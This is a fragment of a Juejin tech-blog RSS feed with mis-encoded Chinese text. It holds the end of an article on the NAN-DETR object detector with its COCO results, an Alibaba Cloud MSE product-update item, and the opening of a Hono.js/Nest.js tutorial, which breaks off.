<li>è®¡ç®—è´¨å¿ƒï¼šé¦–å…ˆæ‰¾åˆ°æ‰€æœ‰é”šç‚¹æ¡†çš„ä¸­å¿ƒç‚¹ï¼Œå¹¶è®¡ç®—å®ƒä»¬çš„å¹³å‡ä¸­å¿ƒï¼ˆè´¨å¿ƒï¼‰ã€‚</li>
<li>å®šå‘æ‰°åŠ¨ï¼šä¸ºæ¯ä¸ªé”šç‚¹ç”Ÿæˆä¸€ä¸ªéšæœºå™ªå£°ï¼Œä½†è¿™ä¸ªå™ªå£°çš„æ–¹å‘è¢«çº¦æŸåœ¨â€œæŒ‡å‘è´¨å¿ƒâ€çš„ç›´çº¿ä¸Šã€‚</li>
<li>å¯æ§ç§»åŠ¨ï¼šé”šç‚¹æ²¿ç€è¿™ä¸ªæ–¹å‘ï¼Œå‘è´¨å¿ƒç§»åŠ¨ä¸€ä¸ªå¯æ§çš„è·ç¦»ã€‚</li>
</ul>
<p>è¿™ä¸ªè¿‡ç¨‹å°±åƒåœ¨æ‹”æ²³æ¯”èµ›å‰ï¼Œæ•™ç»ƒè®©é˜Ÿå‘˜ä»¬å…ˆå‘ä¸­å¿ƒèšæ‹¢ï¼Œç»Ÿä¸€å‘åŠ›æ–¹å‘ï¼Œè€Œä¸æ˜¯å„è‡ªä¹±æ‹‰ã€‚è¿™æ ·æ—¢èƒ½å¼•å…¥å¤šæ ·æ€§ï¼ˆå™ªå£°ï¼‰ï¼Œåˆèƒ½ä¿è¯å¤šé”šç‚¹çš„é¢„æµ‹ä¿æŒä¸€è‡´æ€§ï¼Œå¤§å¤§å¢å¼ºäº†æ¨¡å‹çš„é²æ£’æ€§ã€‚</p>
<ul>
<li><strong>å®Œå…¨äº¤å¹¶æ¯”ï¼ˆCIoUï¼‰æŸå¤±ï¼šè®©æ¡†å®šä½æ›´ç²¾å‡†</strong></li>
</ul>
<p>ç›®æ ‡æ£€æµ‹ä¸ä»…è¦çŸ¥é“â€œæœ‰æ²¡æœ‰â€ï¼Œè¿˜è¦çŸ¥é“â€œåœ¨å“ªé‡Œâ€ï¼Œæ¡†çš„å®šä½ç²¾åº¦è‡³å…³é‡è¦ã€‚ä¼ ç»Ÿçš„IoUæŸå¤±åªè€ƒè™‘é¢„æµ‹æ¡†å’ŒçœŸå®æ¡†çš„é‡å é¢ç§¯ï¼Œå­˜åœ¨æ˜æ˜¾ç¼ºé™·ï¼šå½“ä¸¤ä¸ªæ¡†ä¸é‡å æ—¶ï¼ŒIoUä¸º0ï¼Œæ— æ³•æä¾›æœ‰æ•ˆçš„æ¢¯åº¦ï¼›å®ƒä¹Ÿæ— æ³•åŒºåˆ†ä¸¤ä¸ªåŒæ ·IoUä½†ä¸­å¿ƒç‚¹åå·®å¾ˆå¤§çš„æ¡†ã€‚</p>
<p>NAN-DETRé‡‡ç”¨äº†æ›´å…ˆè¿›çš„CIoUæŸå¤±ã€‚å®ƒåœ¨IoUçš„åŸºç¡€ä¸Šï¼Œé¢å¤–è€ƒè™‘äº†ï¼š</p>
<ul>
<li><strong>ä¸­å¿ƒç‚¹è·ç¦»ï¼š</strong> æƒ©ç½šé¢„æµ‹æ¡†ä¸­å¿ƒä¸çœŸå®æ¡†ä¸­å¿ƒçš„åç¦»ã€‚</li>
<li><strong>å®½é«˜æ¯”ä¸€è‡´æ€§ï¼š</strong> é¼“åŠ±é¢„æµ‹æ¡†æ‹¥æœ‰ä¸çœŸå®æ¡†ç›¸ä¼¼çš„é•¿å®½æ¯”ã€‚</li>
</ul>
<p>CIoUæŸå¤±ä¸ºæ¨¡å‹æä¾›äº†æ›´ä¸°å¯Œã€æ›´ç²¾ç¡®çš„ä¼˜åŒ–ä¿¡å·ï¼Œä½¿å¾—é¢„æµ‹çš„è¾¹ç•Œæ¡†ä¸ä»…åœ¨é‡å åº¦ä¸Šï¼Œåœ¨ä½ç½®å’Œå½¢çŠ¶ä¸Šä¹Ÿæ›´æ¥è¿‘çœŸå®æƒ…å†µã€‚</p>
<h2 data-id="heading-1"><strong>å®éªŒéªŒè¯ï¼šç²¾åº¦å…¨é¢é¢†å…ˆ</strong></h2>
<p>æˆ‘ä»¬åœ¨æƒå¨çš„COCOæ•°æ®é›†ä¸Šå¯¹NAN-DETRè¿›è¡Œäº†å…¨é¢è¯„ä¼°ï¼Œç»“æœä»¤äººæŒ¯å¥‹ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02a2ccc847b04b88a2acf40d3abd31a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878540&amp;x-signature=7IPipLdNR35Xz0qzvTxisUfz15Q%3D" alt="å›¾ç‰‡5.png" loading="lazy"/></p>
<p>ä½¿ç”¨ResNet-50éª¨å¹²ç½‘ç»œæ—¶ï¼ŒNAN-DETRå–å¾—äº†<strong>50.1%çš„AP</strong>ï¼ˆå¹³å‡ç²¾åº¦ï¼‰ï¼Œæ˜¾è‘—è¶…è¿‡äº†Conditional DETRã€Anchor DETRã€Deformable DETRã€DINOã€Co-DETRç­‰ä¸€ä¼—å…ˆè¿›çš„DETRå˜ä½“ï¼Œå±•ç°äº†å…¶å“è¶Šçš„æ£€æµ‹èƒ½åŠ›ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0db898f5a4ac460ba106543e64366827~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878540&amp;x-signature=azIx6H5iXtySpXHyNG8P9Rk7DgU%3D" alt="å›¾ç‰‡6.png" loading="lazy"/></p>
<p>ä½¿ç”¨æ›´å¼ºå¤§çš„Swin-Léª¨å¹²ç½‘ç»œæ—¶ï¼ŒNAN-DETRçš„APè¿›ä¸€æ­¥æå‡è‡³<strong>58.2%</strong> ã€‚ç‰¹åˆ«å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå…¶åœ¨<strong>å¤§å‹ç›®æ ‡æ£€æµ‹ï¼ˆAP_Lï¼‰ä¸Šè¾¾åˆ°äº†74.2%</strong> ï¼Œè¶…è¶Šäº†æ‰€æœ‰å¯¹æ¯”æ–¹æ³•ï¼Œè¿™è¯æ˜äº†å¤šé”šç‚¹ç­–ç•¥å’Œé›†ä¸­å¼å™ªå£°æœºåˆ¶å¯¹äºå¤§å°ºåº¦ç‰©ä½“æ£€æµ‹çš„ç‹¬ç‰¹ä¼˜åŠ¿ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/352673bb830b4f21ab2c926ee1154004~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878540&amp;x-signature=aNjskZBAgOGQG56o%2BJlx5gi3U%2F0%3D" alt="å›¾ç‰‡7.png" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>æ·±å…¥åˆ†æï¼šæ¯ä¸ªæ”¹è¿›éƒ½æœ‰æ•ˆ</strong></h2>
<p>é€šè¿‡ç»†è‡´çš„æ¶ˆèå®éªŒï¼Œæˆ‘ä»¬éªŒè¯äº†æ¯ä¸ªåˆ›æ–°ç‚¹çš„è´¡çŒ®ï¼š</p>
<ul>
<li><strong>å¤šé”šç‚¹ç­–ç•¥æ˜¯æ€§èƒ½åŸºçŸ³ï¼š</strong> ä»…å¼•å…¥å¤šé”šç‚¹ï¼ˆæ— å™ªå£°ï¼‰ï¼ŒAPå°±ä»å•é”šç‚¹çš„49.5%æå‡è‡³49.7%ã€‚</li>
<li><strong>é›†ä¸­å¼å™ªå£°æ˜¯ç¨³å®šå™¨ï¼š</strong> å½“ç»“åˆå¤šé”šç‚¹å’Œé›†ä¸­å¼å™ªå£°åï¼ŒAPæœ€ç»ˆè¾¾åˆ°50.1%ã€‚å™ªå£°æœºåˆ¶æœ‰æ•ˆåè°ƒäº†å¤šé”šç‚¹ï¼Œæå‡äº†ç¨³å®šæ€§ã€‚</li>
<li><strong>CIoUæŸå¤±æ˜¯ç²¾ä¿®å¸ˆï¼š</strong> å³ä½¿åœ¨å•é”šç‚¹æƒ…å†µä¸‹ï¼Œå¼•å…¥CIoUæŸå¤±ä¹Ÿèƒ½å¸¦æ¥å°å¹…ä½†ç¨³å®šçš„ç²¾åº¦æå‡ï¼ˆ49.4% â†’ 49.5%ï¼‰ã€‚</li>
</ul>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5dcafffe4b444ed0a4e058c6ceebe3d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878540&amp;x-signature=maOO1r4CiS7GMSfzLQGVh63EF6M%3D" alt="å›¾ç‰‡8.png" loading="lazy"/></p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39613adf14bc481f86446f1b154a27dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878540&amp;x-signature=BvEpUzU9qSfMYDm%2BAJhIs%2FRJG44%3D" alt="å›¾ç‰‡9.png" loading="lazy"/></p>
<h2 data-id="heading-3"><strong>ç»“è®º</strong></h2>
<p>æœ¬æ–‡æå‡ºäº†ä¸€ç§æ–°å‹ç›®æ ‡æ£€æµ‹æ¡†æ¶NAN-DETRï¼Œå®ƒèåˆäº†åŸºäºè§£ç å™¨çš„<strong>å¤šé”šç‚¹ç­–ç•¥ã€ä¸­å¿ƒåŒ–å™ªå£°æœºåˆ¶ä»¥åŠå®Œå…¨äº¤å¹¶æ¯”ï¼ˆCIoUï¼‰æŸå¤±å‡½æ•°</strong>ã€‚åœ¨COCOæ•°æ®é›†ä¸Šçš„å®éªŒç»“æœè¡¨æ˜ï¼Œä¸ç°æœ‰çš„DETRå˜ä½“ç›¸æ¯”ï¼ŒNAN-DETRæ˜¾è‘—æé«˜äº†æ£€æµ‹ç²¾åº¦ã€‚å¤šé”šç‚¹ç­–ç•¥å¢å¼ºäº†ç›®æ ‡åŒ¹é…çš„æœ‰æ•ˆæ€§ï¼Œè€Œä¸­å¿ƒåŒ–å™ªå£°æœºåˆ¶å’ŒCIoUæŸå¤±å‡½æ•°åˆ™æœ‰åŠ©äºæé«˜å„ç§æ£€æµ‹ä»»åŠ¡çš„ç²¾åº¦ã€‚</p>
<p>å°½ç®¡å¦‚æ­¤ï¼Œæ‰€æå‡ºçš„æ–¹æ³•åœ¨æŸäº›æ–¹é¢ä»æœ‰æ”¹è¿›ç©ºé—´ã€‚ç›®å‰ï¼ŒNAN-DETRå¹¶æœªä¼˜å…ˆè€ƒè™‘å¤„ç†é€Ÿåº¦æˆ–å®æ—¶æ€§èƒ½ï¼Œä½†ä¸€ç§æ½œåœ¨çš„æ•ˆç‡æå‡ç­–ç•¥æ˜¯åˆ©ç”¨æ¨¡å‹è’¸é¦æŠ€æœ¯ã€‚å¦ä¸€æ–¹é¢ï¼Œæœªæ¥çš„ç ”ç©¶æ–¹å‘ä¹‹ä¸€æ˜¯æ¢ç´¢æ”¹è¿›é›†ä¸­å¼å™ªå£°æœºåˆ¶ï¼Œä¾‹å¦‚åˆ©ç”¨ä»éª¨å¹²ç½‘ç»œä¸­å­¦ä¹ åˆ°çš„å‚æ•°åŠ¨æ€è°ƒæ•´æ‰°åŠ¨å¹…åº¦ï¼Œä»¥è¿›ä¸€æ­¥æå‡æ£€æµ‹æ€§èƒ½ï¼Œå°¤å…¶æ˜¯åœ¨æ£€æµ‹å°ç›®æ ‡æ—¶ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é˜¿é‡Œäº‘å¾®æœåŠ¡å¼•æ“ MSE åŠ API ç½‘å…³ 2025 å¹´ 11 æœˆäº§å“åŠ¨æ€]]></title>    <link>https://juejin.cn/post/7581481178823393299</link>    <guid>https://juejin.cn/post/7581481178823393299</guid>    <pubDate>2025-12-09T08:19:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581481178823393299" data-draft-id="7581669438575968292" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é˜¿é‡Œäº‘å¾®æœåŠ¡å¼•æ“ MSE åŠ API ç½‘å…³ 2025 å¹´ 11 æœˆäº§å“åŠ¨æ€"/> <meta itemprop="keywords" content="å¾®æœåŠ¡"/> <meta itemprop="datePublished" content="2025-12-09T08:19:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘äº‘åŸç”Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é˜¿é‡Œäº‘å¾®æœåŠ¡å¼•æ“ MSE åŠ API ç½‘å…³ 2025 å¹´ 11 æœˆäº§å“åŠ¨æ€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘äº‘åŸç”Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T08:19:26.000Z" title="Tue Dec 09 2025 08:19:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6974d5da923b4b34ad2c8063db49d016~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765873165&amp;x-signature=8OjDj%2BBvhRKy4lQEpSlSrNx7YZs%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[nest.js / hono.js ä¸€èµ·å­¦ï¼honoçš„è®¾è®¡æ€æƒ³ï¼]]></title>    <link>https://juejin.cn/post/7580564126403362866</link>    <guid>https://juejin.cn/post/7580564126403362866</guid>    <pubDate>2025-12-08T01:44:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580564126403362866" data-draft-id="7580251192330420270" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="nest.js / hono.js ä¸€èµ·å­¦ï¼honoçš„è®¾è®¡æ€æƒ³ï¼"/> <meta itemprop="keywords" content="å‰ç«¯,Node.js"/> <meta itemprop="datePublished" content="2025-12-08T01:44:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å­Ÿç¥¥_æˆéƒ½"/> <meta itemprop="url" content="https://juejin.cn/user/96412752684744"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            nest.js / hono.js ä¸€èµ·å­¦ï¼honoçš„è®¾è®¡æ€æƒ³ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/96412752684744/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å­Ÿç¥¥_æˆéƒ½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T01:44:35.000Z" title="Mon Dec 08 2025 01:44:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    172
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>æ¬¢è¿åˆ°æˆ‘ä»¬çš„äº¤æµç¾¤ä¸€èµ·äº¤æµå„ç§å‰ç«¯æŠ€æœ¯ï¼ŒåŒæ—¶æ¬¢è¿è®¿é—®æˆ‘çš„ headless ç»„ä»¶åº“ï¼ŒåŒæ—¶æ„Ÿè°¢ä½ çš„ starï¼š</p>
<ul>
<li><a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.frontlight.tech%2F" title="https://link.juejin.cn/?target=https%3A%2F%2Fwww.frontlight.tech%2F" target="_blank">å›½å†…å®˜ç½‘</a></li>
<li><a href="https://link.juejin.cn/?target=https%3A%2F%2Fgithub.com%2Flio-mengxiang%2Ft-ui" title="https://link.juejin.cn/?target=https%3A%2F%2Fgithub.com%2Flio-mengxiang%2Ft-ui" target="_blank">æ„Ÿè°¢ github star</a></li>
</ul>
<hr/>
<p>nest.js / hono.js ä¸€èµ·å­¦ç³»åˆ—ï¼Œæœ€ç»ˆä¼šå°è£…ä¸€ä¸ªé€šç”¨çš„æ¶å­ï¼Œä¾‹å¦‚æœ‰é‰´æƒï¼Œæ—¥å¿—æ”¶é›†ï¼Œå¤šç¯å¢ƒé…ç½®ç­‰ç­‰åŠŸèƒ½ï¼Œç”¨ä¸¤ç§æ¡†æ¶å»å®ç°ã€‚
ä¹‹å‰å†™äº†ä¸€ç¯‡</p>
<ul>
